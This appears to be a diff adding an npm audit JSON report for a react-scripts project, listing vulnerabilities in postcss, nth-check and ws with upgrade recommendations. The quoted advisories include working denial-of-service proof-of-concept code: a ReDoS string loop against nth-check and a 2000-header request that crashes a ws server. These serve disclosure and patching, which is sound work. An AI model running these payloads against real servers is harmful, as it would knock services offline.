@@ -1,0 +1,196 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1098393,
+          "path": "react-scripts>jest>@jest/core>jest-config>jest-environment-jsdom>jsdom>ws",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1098393,
+          "path": "react-scripts>jest>jest-cli>@jest/core>jest-config>jest-environment-jsdom>jsdom>ws",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1098393,
+          "path": "react-scripts>jest>jest-cli>@jest/core>jest-config>jest-runner>jest-environment-jsdom>jsdom>ws",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "ws",
+      "target": "7.5.10",
+      "depth": 9
+    },
+    {
+      "action": "review",
+      "module": "postcss",
+      "resolves": [
+        {
+          "id": 1094544,
+          "path": "react-scripts>resolve-url-loader>postcss",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "nth-check",
+      "resolves": [
+        {
+          "id": 1095141,
+          "path": "react-scripts>@svgr/webpack>@svgr/plugin-svgo>svgo>css-select>nth-check",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1094544": {
+      "findings": [
+        {
+          "version": "7.0.39",
+          "paths": [
+            "react-scripts>resolve-url-loader>postcss"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2023-44270\n- https://github.com/postcss/postcss/commit/58cc860b4c1707510c9cd1bc1fa30b423a9ad6c5\n- https://github.com/postcss/postcss/blob/main/lib/tokenize.js#L25\n- https://github.com/postcss/postcss/releases/tag/8.4.31\n- https://github.com/github/advisory-database/issues/2820\n- https://github.com/advisories/GHSA-7fh5-64p2-3v2j",
+      "created": "2023-09-30T00:31:10.000Z",
+      "id": 1094544,
+      "npm_advisory_id": null,
+      "overview": "An issue was discovered in PostCSS before 8.4.31. It affects linters using PostCSS to parse external Cascading Style Sheets (CSS). There may be `\\r` discrepancies, as demonstrated by `@font-face{ font:(\\r/*);}` in a rule.\n\nThis vulnerability affects linters using PostCSS to parse external untrusted CSS. An attacker can prepare CSS in such a way that it will contains parts parsed by PostCSS as a CSS comment. After processing by PostCSS, it will be included in the PostCSS output in CSS nodes (rules, properties) despite being originally included in a comment.",
+      "reported_by": null,
+      "title": "PostCSS line return parsing error",
+      "metadata": null,
+      "cves": [
+        "CVE-2023-44270"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "postcss",
+      "vulnerable_versions": "<8.4.31",
+      "github_advisory_id": "GHSA-7fh5-64p2-3v2j",
+      "recommendation": "Upgrade to version 8.4.31 or later",
+      "patched_versions": ">=8.4.31",
+      "updated": "2023-11-05T05:05:37.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-74",
+        "CWE-144"
+      ],
+      "url": "https://github.com/advisories/GHSA-7fh5-64p2-3v2j"
+    },
+    "1095141": {
+      "findings": [
+        {
+          "version": "1.0.2",
+          "paths": [
+            "react-scripts>@svgr/webpack>@svgr/plugin-svgo>svgo>css-select>nth-check"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2021-3803\n- https://github.com/fb55/nth-check/commit/9894c1d2010870c351f66c6f6efcf656e26bb726\n- https://huntr.dev/bounties/8cf8cc06-d2cf-4b4e-b42c-99fafb0b04d0\n- https://lists.debian.org/debian-lts-announce/2023/05/msg00023.html\n- https://github.com/advisories/GHSA-rp65-9cf3-cjxr",
+      "created": "2021-09-20T20:47:31.000Z",
+      "id": 1095141,
+      "npm_advisory_id": null,
+      "overview": "There is a Regular Expression Denial of Service (ReDoS) vulnerability in nth-check that causes a denial of service when parsing crafted invalid CSS nth-checks.\n\nThe ReDoS vulnerabilities of the regex are mainly due to the sub-pattern `\\s*(?:([+-]?)\\s*(\\d+))?` with quantified overlapping adjacency and can be exploited with the following code.\n\n**Proof of Concept**\n```js\n// PoC.js\nvar nthCheck = require(\"nth-check\")\nfor(var i = 1; i <= 50000; i++) {\n    var time = Date.now();\n    var attack_str = '2n' + ' '.repeat(i*10000)+\"!\";\n    try {\n        nthCheck.parse(attack_str) \n    }\n    catch(err) {\n        var time_cost = Date.now() - time;\n        console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost+\" ms\")\n    }\n}\n```\n\n**The Output**\n```\nattack_str.length: 10003: 174 ms\nattack_str.length: 20003: 1427 ms\nattack_str.length: 30003: 2602 ms\nattack_str.length: 40003: 4378 ms\nattack_str.length: 50003: 7473 ms\n```",
+      "reported_by": null,
+      "title": "Inefficient Regular Expression Complexity in nth-check",
+      "metadata": null,
+      "cves": [
+        "CVE-2021-3803"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "nth-check",
+      "vulnerable_versions": "<2.0.1",
+      "github_advisory_id": "GHSA-rp65-9cf3-cjxr",
+      "recommendation": "Upgrade to version 2.0.1 or later",
+      "patched_versions": ">=2.0.1",
+      "updated": "2023-11-29T22:11:25.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-rp65-9cf3-cjxr"
+    },
+    "1098393": {
+      "findings": [
+        {
+          "version": "7.5.9",
+          "paths": [
+            "react-scripts>jest>@jest/core>jest-config>jest-environment-jsdom>jsdom>ws",
+            "react-scripts>jest>jest-cli>@jest/core>jest-config>jest-environment-jsdom>jsdom>ws",
+            "react-scripts>jest>jest-cli>@jest/core>jest-config>jest-runner>jest-environment-jsdom>jsdom>ws"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q\n- https://github.com/websockets/ws/issues/2230\n- https://github.com/websockets/ws/pull/2231\n- https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f\n- https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e\n- https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c\n- https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63\n- https://github.com/advisories/GHSA-3h5v-q93c-6h6q",
+      "created": "2024-06-17T19:09:10.000Z",
+      "id": 1098393,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA request with a number of headers exceeding the[`server.maxHeadersCount`][] threshold could be used to crash a ws server.\n\n### Proof of concept\n\n```js\nconst http = require('http');\nconst WebSocket = require('ws');\n\nconst wss = new WebSocket.Server({ port: 0 }, function () {\n  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');\n  const headers = {};\n  let count = 0;\n\n  for (let i = 0; i < chars.length; i++) {\n    if (count === 2000) break;\n\n    for (let j = 0; j < chars.length; j++) {\n      const key = chars[i] + chars[j];\n      headers[key] = 'x';\n\n      if (++count === 2000) break;\n    }\n  }\n\n  headers.Connection = 'Upgrade';\n  headers.Upgrade = 'websocket';\n  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';\n  headers['Sec-WebSocket-Version'] = '13';\n\n  const request = http.request({\n    headers: headers,\n    host: '127.0.0.1',\n    port: wss.address().port\n  });\n\n  request.end();\n});\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@8.17.1 (https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)\n\n### Workarounds\n\nIn vulnerable versions of ws, the issue can be mitigated in the following ways:\n\n1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.\n2. Set `server.maxHeadersCount` to `0` so that no limit is applied.\n\n### Credits\n\nThe vulnerability was reported by [Ryan LaPointe](https://github.com/rrlapointe) in https://github.com/websockets/ws/issues/2230.\n\n### References\n\n- https://github.com/websockets/ws/issues/2230\n- https://github.com/websockets/ws/pull/2231\n\n[`--max-http-header-size=size`]: https://nodejs.org/api/cli.html#--max-http-header-sizesize\n[`maxHeaderSize`]: https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener\n[`server.maxHeadersCount`]: https://nodejs.org/api/http.html#servermaxheaderscount\n",
+      "reported_by": null,
+      "title": "ws affected by a DoS when handling a request with many HTTP headers",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-37890"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "ws",
+      "vulnerable_versions": ">=7.0.0 <7.5.10",
+      "github_advisory_id": "GHSA-3h5v-q93c-6h6q",
+      "recommendation": "Upgrade to version 7.5.10 or later",
+      "patched_versions": ">=7.5.10",
+      "updated": "2024-08-05T05:02:34.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-476"
+      ],
+      "url": "https://github.com/advisories/GHSA-3h5v-q93c-6h6q"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 1,
+      "high": 4,
+      "critical": 0
+    },
+    "dependencies": 1844,
+    "devDependencies": 0,
+    "optionalDependencies": 4,
+    "totalDependencies": 1848
+  },
+  "runId": "b5c169ba-3748-4454-8d6c-0e7d9a9ef891"
+}
